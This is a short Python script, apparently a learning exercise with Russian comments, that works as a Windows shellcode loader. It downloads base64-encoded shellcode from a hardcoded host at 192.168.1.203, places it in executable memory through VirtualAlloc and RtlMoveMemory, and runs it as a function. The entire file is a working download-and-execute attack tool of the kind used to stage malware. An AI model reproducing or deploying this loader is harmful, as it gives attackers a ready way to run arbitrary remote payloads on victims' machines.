from urllib import request

import base64
import ctypes


kernel32 = ctypes.windll.kernel32


def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())

    return shellcode


def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p # говорим библиотеке ctypes что когда я вызываю функцию VirtualAlloc ты должен вернуть мне объект типа c_void_p(указатель)
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40) # выделяем память в адресном пространстве текущего процесса 

    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p, # обозначаем принимаемые аргументы для RtlMoveMemory 1 куда перезаписываем информацию 2 откуда читаем информацию а 3 это тип для размера данных
        ctypes.c_size_t)
    kernel32.RtlMoveMemory(ptr, buf, length) # ptr указываем куда будем помещать инфу(шелл) из буфера, затем что помещать и какого оно будет размера
    return ptr


def run(shellcode):
    buf = ctypes.create_string_buffer(shellcode) # сохраняем шеллкод в буффер
    ptr = write_memory(buf)
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None)) # превращаем указатель в память в указатель на функцию. т.е. мы теперь можешь взаимодействовать с шеллкодом как с функцией
    shell_func() # и следовательно мы это и делаем


if __name__ == '__main__':
    url = "http://192.168.1.203:8000/my32shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)
